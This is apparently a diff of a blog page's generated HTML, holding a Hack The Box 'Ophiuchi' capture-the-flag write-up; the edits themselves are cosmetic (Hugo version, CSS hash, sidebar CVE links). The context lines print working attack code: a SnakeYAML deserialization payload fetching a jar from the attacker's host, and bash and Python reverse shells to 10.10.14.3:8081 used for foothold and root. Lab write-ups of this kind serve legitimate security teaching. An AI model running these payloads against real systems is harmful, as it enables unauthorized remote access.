@@ -97,13 +97,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.154.2">
+<meta name="generator" content="Hugo 0.162.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.b29560288abdb6366b230cde3c59285c98c1152dccc466ddf7135289406f621e.css">
 
 
     
@@ -283,6 +283,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -303,6 +305,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13374/">Kalrav AI Agent &lt;= 2.3.3 - Unauthenticated Arbitrary File Upload via kalrav_upload_file AJAX Action</a>
                             </li>
                         
@@ -318,10 +324,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -330,6 +332,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -465,7 +469,7 @@
       "url": "\/images\/d0n601.png"
     }
   },
-  "image": "null",
+  "image": "\"/images/ryan‑kozak.jpg\"",
   "mainEntityOfPage": {
     "@type": "WebPage",
     "@id": "https:\/\/ryankozak.com\/posts\/hack-the-box-ophiuchi-writeup\/"
@@ -546,7 +550,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <img src="/posts/images/hack-the-box-ophiuchi-writeup/clone.png" alt="clone_repo">
 <strong>Figure 3:</strong> Clone yaml-payload repo.</p>
 <p>We then navigate to <code>yaml-payload/src/artsploit</code> and modify the <code>AwesomeScriptEngineFactory()</code> method within <code>AwesomeScriptEngineFactory.java</code>. The default payload pops open the calculator application on MacOS. The payloads that are posted in <em><a href="https://github.com/artsploit/yaml-payload/issues/3" target="_blank">issue 3</a></em> of this repo will call a reverse shell, so rather than recreating them, we&rsquo;ll drop the first payload into <code>AwesomeScriptEngineFactory.java</code> with our IP address as the callback.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">AwesomeScriptEngineFactory</span>() {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">AwesomeScriptEngineFactory</span>() {
 </span></span><span style="display:flex;"><span>    String <span style="color:#f92672">[]</span> cmd<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.3/8081 0&gt;&amp;1&#34;</span>};
 </span></span><span style="display:flex;"><span>    String <span style="color:#f92672">[]</span> jex<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}&#34;</span>};
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
@@ -566,7 +570,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p><img src="/posts/images/hack-the-box-ophiuchi-writeup/copy_server.png" alt="copy_server"><br>
 <strong>Figure 6:</strong> Copy <code>yaml-payload.jar</code> to Apache&rsquo;s directory and start the server.</p>
 <p>By placing the snippet below into the YAML parser, we&rsquo;ll download the payload we&rsquo;ve just created and hosted, and execute it  on the victim machine (we must first not forget to start our netcat listener on port 8081)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">!!</span>javax.<span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">ScriptEngineManager</span> <span style="color:#f92672">[</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">!!</span>javax.<span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">ScriptEngineManager</span> <span style="color:#f92672">[</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">!!</span>java.<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">URLClassLoader</span> <span style="color:#f92672">[[</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">!!</span>java.<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">URL</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;http://10.10.14.3/yaml-payload.jar&#34;</span><span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">]]</span>
@@ -594,7 +598,7 @@ User admin may run the following commands on ophiuchi:
     (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
 ---
 </code></pre><p>When we examine the <code>/opt/wasm-functions/index.go</code> file, we can see that it reads <code>main.wasm</code> without a path, and calls <code>deploy.sh</code> without a path. If a variable <code>f</code> is set equal to <code>1</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
 </span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;fmt&#34;</span>
@@ -666,7 +670,7 @@ Resolving deltas: 100% (23736/23736), done.
 <img src="/posts/images/hack-the-box-ophiuchi-writeup/recompile.png" alt="recompile"><br>
 <strong>Figure 11:</strong> After modifying <code>i32.const</code> to be equal <code>1</code>, we place <code>main.wasm</code> back onto the victim machine.</p>
 <p>Next, we ssh back into the box as <code>admin</code>. We&rsquo;ll navigate to the <code>/tmp</code> directory and create our own <code>deploy.sh</code> to call our reverse shell. Since we know port <code>8081</code> worked last time, we&rsquo;ll use that again (make sure the old listener used to catch the foothold is reset). The reverse shell payload will be the following python payload.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.3&#34;,8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.3&#34;,8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);</span>
 </span></span></code></pre></div><p><img src="/posts/images/hack-the-box-ophiuchi-writeup/deploy_sh.png" alt="deploy_sh"><br>
 <strong>Figure 12:</strong> SSH back in and create a malicious <code>deploy.sh</code> to call a reverse shell.</p>
 <p>To gain root privileges we&rsquo;ll do what we know we&rsquo;re allowed to do which is <code>sudo /usr/bin/go run /opt/wasm-functions/index.go</code>, and as you can see below netcat has caught the root reverse shell.<br>
